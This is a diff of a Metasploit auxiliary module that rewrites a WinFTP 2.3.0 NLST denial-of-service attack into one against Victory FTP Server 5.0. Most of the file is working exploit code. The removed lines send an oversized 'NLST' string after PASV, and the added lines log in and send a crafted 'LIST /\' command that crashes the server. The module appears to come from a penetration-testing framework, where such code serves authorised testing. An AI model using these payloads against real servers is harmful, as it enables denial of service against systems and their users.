@@ -9,6 +9,7 @@
 # http://metasploit.com/projects/Framework/ 
 ##
 
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -18,29 +19,34 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def initialize(info = {})
 		super(update_info(info,	
-			'Name'           => 'WinFTP 2.3.0 NLST Denial of Service',
+			'Name'           => 'Victory FTP Server 5.0 LIST DoS',
 			'Description'    => %q{
-				This module is a very rough port of Julien Bedard's
-				PoC.  You need a valid login, but even anonymous can
-				do it if it has permission to call NLST.
+				The Victory FTP Server v5.0 can be brought down by sending
+				a very simple LIST command
 			},
 			'Author'         => 'kris',
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
 			'References'     =>
-				[ [ 'URL', 'http://milw0rm.com/exploits/6581'] ],
-			'DisclosureDate' => 'Sep 26 2008'))
+				[ [ 'URL', 'http://milw0rm.com/exploits/6834' ] ],
+			'DisclosureDate' => 'Oct 24 2008'))
+
+		# They're required
+		register_options([
+			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
+			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
+		])
 	end
 
 	def run
 		return unless connect_login
 
-		raw_send_recv("PASV\r\n") # NLST has to follow a PORT or PASV
+		print_status("Sending command...")
 
-		sleep(1) # *sigh* this appears to be necessary in my tests
-
-		raw_send("NLST #{'..?' * 35000}\r\n")
+		# Try to wait for a response
+		raw_send_recv("LIST /\\\r\n")
 
 		disconnect
 	end
 end
+
